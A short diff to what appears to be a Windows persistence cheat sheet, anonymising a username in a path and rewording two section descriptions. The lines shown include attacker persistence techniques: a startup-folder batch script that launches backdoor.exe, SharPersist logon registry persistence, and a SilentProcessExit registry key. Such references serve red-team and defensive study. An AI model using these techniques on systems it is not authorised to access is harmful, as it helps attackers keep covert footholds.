@@ -178,11 +178,11 @@ SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonsc
 
 ### Startup
 
-Create a batch script in the user startup folder.
+Create a batch script in the user startup folder: `%AppData%`
 
 ```powershell
-PS C:\> gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
-start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
+PS C:\> gc C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
+start /b C:\Users\Username\AppData\Local\Temp\backdoor.exe
 ```
 
 Using SharPersist
@@ -348,7 +348,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\not
 
 ### Startup Elevated
 
-Create a batch script in the user startup folder.
+Create a batch script in the `ProgramData` startup folder.
 
 ```powershell
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
